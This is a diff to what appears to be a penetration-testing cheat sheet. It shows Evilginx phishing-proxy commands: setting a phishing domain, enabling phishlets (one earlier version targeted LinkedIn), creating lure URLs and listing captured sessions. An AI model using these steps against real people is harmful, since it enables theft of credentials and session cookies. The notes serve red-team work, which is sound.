@@ -41,6 +41,14 @@ $ make
 $ sudo ./build/evilginx -p ./phishlets -t ./redirectors -developer
 ```
 
+### Basic Commands
+
+```c
+: phishlets
+: lures
+: sessions
+```
+
 ### Prepare Certificates
 
 ```c
@@ -48,11 +56,11 @@ $ sudo cp /root/.evilginx/crt/ca.crt /usr/local/share/ca-certificates/evilginx.c
 $ sudo update-ca-certificates
 ```
 
-### Setup Phishing Domain
+### Domain Setup
 
 ```c
 : config domain <DOMAIN>
-: config ipv4 127.0.0.1
+: config ipv4 <LHOST>
 ```
 
 ### Phishlets
@@ -62,11 +70,8 @@ $ sudo update-ca-certificates
 > https://github.com/An0nUD4Y/Evilginx2-Phishlets
 
 ```c
-: phishlets hostname linkedin linkedin.<DOMAIN>
-: phishlets enable linkedin
-: phishlets unauth_url linkedin https://<DOMAIN>
-: phishlets get-hosts linkedin
-: phishlets linkedin
+: phishlets hostname <PHISHLET> <DOMAIN>
+: phishlets enable <PHISHLET>
 ```
 
 ### Lures
@@ -74,16 +79,15 @@ $ sudo update-ca-certificates
 > https://help.evilginx.com/docs/guides/lures
 
 ```c
-: lures create linkedin
-: lures
-: lures get-url 0
+: lures create <PHISHLET>
+: lures get-url <ID>
 ```
 
-### Sessions
+### Session Handling
 
 ```c
 : sessions
-: sessions 0
+: sessions <ID>
 ```
 
 ## Gophish
